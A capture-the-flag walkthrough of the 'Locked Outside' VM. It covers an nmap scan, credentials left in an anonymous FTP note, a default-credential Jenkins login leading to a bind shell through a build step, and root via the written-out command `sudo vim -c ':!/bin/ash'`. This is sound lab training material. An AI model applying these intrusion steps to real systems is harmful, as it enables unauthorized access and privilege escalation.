# Locked Outside

![](https://i.imgur.com/HOmN8LN.png)

- Downloading the ove and booting it on virtual box we get this prompt

![](https://i.imgur.com/JORVEzz.png)

- typically in any machine the first thing we check for is services/open ports we lets start with a Nmap scan `nmap -T4 -A -p- -vv 10.0.2.14`

```bash
┌──(root💀kali)-[~/Downloads]
└─# nmap -A -vv -T5 -p- 10.0.2.14  
Discovered open port 22/tcp on 10.0.2.14
Discovered open port 8080/tcp on 10.0.2.14
Discovered open port 21/tcp on 10.0.2.14
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        21            129 Jun 22 09:50 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 38:08:fc:0d:8a:8a:f8:ea:fb:4d:6c:af:1d:22:e1:ff (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDUfxuf+Y9ICIozkbq2t2qrktAL1/uuwg1Gsh3td/uQ+2s5PYL3R8jZFnFYXB3/mRDrugzjghzkU9l1tlHBNWFTtQHwcaHDPyz0Rrx8eTOPrSfqr4OQv2w7lEWuw/obUYQW6V+VqDeGCi2fFmfUaPXrbPrcyIYBzHYAcSQPHR27rSckNLP066J8s/0C/POyrIX0TiOGgVOqA9kDNCUFIl1SCFQeqsWlmjivXxiUh6IZQwRdA58zkFW1Fxbzl4EZNEXyPK+/T07ZI8OIWCdI6LvoO+jrepos/r6Gprw0bPr6TNHLIxGsVYR0lrkcnUr8RoSGteS+bu81k+c9+ahMQgIUEetp7V3ASm676CnOxZ3Q182ECcwSA2bvwsLhMWOOrVwvJOTXdnrzKy/YKmPqY+xz592hHsv5pBj3RNp4C8vl3BZzQzl+7xkOTVkrfuTPab7B9MSzYisveYX/Yxrw5qvrvsBUWZpopZCi9SefSTVcYMnswAuUeNyqZRHMvRcc5oM=
|   256 2d:d7:bf:a1:62:58:18:d9:80:e7:7c:15:c6:d6:32:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHIJGMwqXiPkyMB5UeGlr3/gWwMVqenfOvHr8ZRHzFX6Qvqt5CMq6jeZkTKjyik2oR+iyWhG+xUnDA1b9hz5enA=
|   256 34:7a:7e:dd:ba:a7:be:d7:3c:0e:9b:5a:73:cb:86:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAjY/PxV7U/UezwqeFt/5iKT4+vdgsuUdZgKX70l+IGr
8080/tcp open  http    syn-ack ttl 64 Jetty 9.4.39.v20210325
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Site doesn't have a title (text/html;charset=utf-8)

```

- the first thing we see is ftp is open and there is a note.txt and anonymous login is allowed so let's login using `anonymous:anonymous` and get the flag

- note.txt :

```
# Jenkins Development Server
# This is a development server
# default credentials - ssh
# username: root
# password: alpine_r00t
```

- tbh I didn't use these creds maybe they were meant to be used in a different path than the one I took but let's continue opening the http server we see jenkins

![](https://i.imgur.com/IZN3hvw.png)

- I tried the default creds and it worked `admin:admin`, I tried multiple ways in this [blog](https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins) to try and get a shell but most of them failed, the successful one was
  - Create a new project (Freestyle project)
  - Inside Build section set Execute shell and paste a bind shell (reverse shell didn't work for me and since this is a Linux machine we can't use PowerShell)

    ![](https://i.imgur.com/tvgL6Tl.png)
  
  - Click Build now
  - Start nc on the attacker machine
  - We have a shell :)

    ![](https://i.imgur.com/FfAxYJn.png)

- Now that we have a shell, we can try to priv escalate to root so let's check `sudo -l` to see what commands we can run at root

```bash
sudo -l
User jenkins may run the following commands on lockedout:
    (root) NOPASSWD: /usr/bin/vim
```

- since we can run vim using sudo, according to gtfobins we can priv escalate using this command `sudo vim -c ':!/bin/ash'`

![](https://i.imgur.com/uZ3v07l.png)

- since we are successfully pwned the machine we can check for the flag but `/root` and `/home` is empty since the description said that their ssh access was blocked we can check ssh config file located at `/etc/ssh/sshd_config` and if we try to cat it we can see that the flag is located there.

![](https://i.imgur.com/rNyUiDk.png)

- Flag: flag{r00t_l0gin_1s_1ns3cur3}